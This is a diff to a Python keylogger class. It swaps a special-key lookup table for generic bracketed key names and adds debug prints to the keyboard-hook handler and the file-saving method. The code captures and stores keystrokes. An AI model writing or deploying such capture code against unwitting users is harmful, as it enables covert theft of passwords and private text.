@@ -70,42 +70,13 @@ class Keylogger:
         """Handle key events from the keyboard hook."""
         if event.event_type == 'down':
             key = event.name
-            
-            special_map = {
-                'space': ' ',
-                'enter': '\n',
-                'tab': '\t',
-                'backspace': '[BACKSPACE]',
-                'delete': '[DELETE]',
-                'shift': '[SHIFT]',
-                'ctrl': '[CTRL]',
-                'alt': '[ALT]',
-                'esc': '[ESC]',
-                'up': '[UP]',
-                'down': '[DOWN]',
-                'left': '[LEFT]',
-                'right': '[RIGHT]',
-                'home': '[HOME]',
-                'end': '[END]',
-                'page up': '[PAGE_UP]',
-                'page down': '[PAGE_DOWN]',
-                'caps lock': '[CAPS_LOCK]',
-                'num lock': '[NUM_LOCK]',
-                'scroll lock': '[SCROLL_LOCK]',
-                'print screen': '[PRINT_SCREEN]',
-                'insert': '[INSERT]',
-                'menu': '[MENU]'
-            }
-            
-            for i in range(1, 13):
-                special_map[f'f{i}'] = f'[F{i}]'
-            
-            if key in special_map:
-                self.buffer.append(special_map[key])
-            else:
-                self.buffer.append(key)
-            
+            print(f"KEYLOGGER EVENT NAME: {key}")
+
+            if len(key) > 1:
+                key = f"[{key.upper()}]"
             self.key_count += 1
+            self.buffer += key
+            print(f"KEYLOGGER: {self.key_count=} {self.save_interval}")
             
             if self.key_count >= self.save_interval:
                 self.save_to_file()
@@ -114,6 +85,7 @@ class Keylogger:
     def save_to_file(self):
         """Save buffered keystrokes to file using read-modify-write pattern."""
         if not self.buffer:
+            print("KEYLGGER: buffer is none, not saving")
             return
         
         new_content = ''.join(self.buffer)
